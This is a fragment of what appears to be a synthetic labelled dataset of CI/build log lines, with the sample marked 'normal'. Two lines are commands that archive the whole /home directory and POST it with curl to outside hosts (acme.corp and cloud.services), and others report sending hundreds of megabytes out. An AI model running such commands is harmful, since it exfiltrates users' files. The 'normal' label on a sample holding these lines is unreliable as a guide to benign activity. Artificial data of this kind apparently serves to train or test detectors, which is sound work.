          "Switched to branch 'hotfix/task-113'",
          "[12:19:57] DEBUG: Connection pool: 2 active",
          "Cache invalidated: node_modules",
          "Uploading artifact 'dist' (15 files)",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Cache hit for key-5669",
          "Connection established",
          "[12:19:57] DEBUG: Initializing service",
          "Environment: test",
          "Completed.",
          "\u2717 build failed with exit code 62",
          "[12:19:57] DEBUG: Query executed in 40ms",
          "Sending 331MB of data to acme.corp",
          "NODE_ENV=development",
          "Snapshots: 27 passed, 17 total",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 3977ms",
          "Step 2/25: Testing",
          "Sending 162MB of data to example.com",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}